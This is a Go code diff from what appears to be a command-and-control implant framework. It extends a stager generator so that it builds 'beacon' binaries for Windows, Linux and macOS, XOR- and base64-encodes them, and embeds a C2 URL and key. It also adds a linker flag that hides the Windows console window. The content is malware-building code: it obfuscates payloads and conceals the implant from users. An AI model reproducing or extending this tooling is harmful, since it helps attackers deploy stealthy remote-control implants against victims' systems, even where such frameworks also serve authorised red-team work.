@@ -14,10 +14,23 @@ import (
 // GenerateStage builds a full beacon EXE then XOR-encodes + base64-encodes it.
 // Returns the path to the encoded stage file and the hex-encoded XOR key.
 func GenerateStage(cfg ImplantConfig, outputDir string) (stagePath string, xorKeyHex string, err error) {
-	// Generate the full beacon EXE first
-	exePath, err := GenerateWindowsEXE(cfg, outputDir)
+	return GenerateStageForOS(cfg, outputDir, "windows")
+}
+
+// GenerateStageForOS builds a full beacon binary for the given OS, then XOR-encodes + base64-encodes it.
+func GenerateStageForOS(cfg ImplantConfig, outputDir, goos string) (stagePath string, xorKeyHex string, err error) {
+	// Generate the full beacon binary for the target OS
+	var exePath string
+	switch goos {
+	case "linux":
+		exePath, err = GenerateLinuxELF(cfg, outputDir)
+	case "darwin":
+		exePath, err = GenerateMacOS(cfg, outputDir)
+	default:
+		exePath, err = GenerateWindowsEXE(cfg, outputDir)
+	}
 	if err != nil {
-		return "", "", fmt.Errorf("generate stage exe failed: %w", err)
+		return "", "", fmt.Errorf("generate stage binary failed: %w", err)
 	}
 
 	// Read the EXE binary
@@ -149,7 +162,7 @@ go 1.25
 		return s
 	}
 
-	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.XORKey=%s"`,
+	ldflags := fmt.Sprintf(`-s -w -buildid= -H=windowsgui -X "main.C2URL=%s" -X "main.XORKey=%s"`,
 		escape(cfg.C2URL),
 		escape(xorKeyHex),
 	)
@@ -172,9 +185,9 @@ go 1.25
 		return "", err
 	}
 
-	goCmd, err := getGoCmd()
-	if err != nil {
-		return "", err
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH")
 	}
 
 	tidyCmd := exec.Command(goCmd, "mod", "tidy")
@@ -327,9 +340,9 @@ go 1.25
 		return "", err
 	}
 
-	goCmd, err := getGoCmd()
-	if err != nil {
-		return "", err
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH")
 	}
 
 	tidyCmd := exec.Command(goCmd, "mod", "tidy")
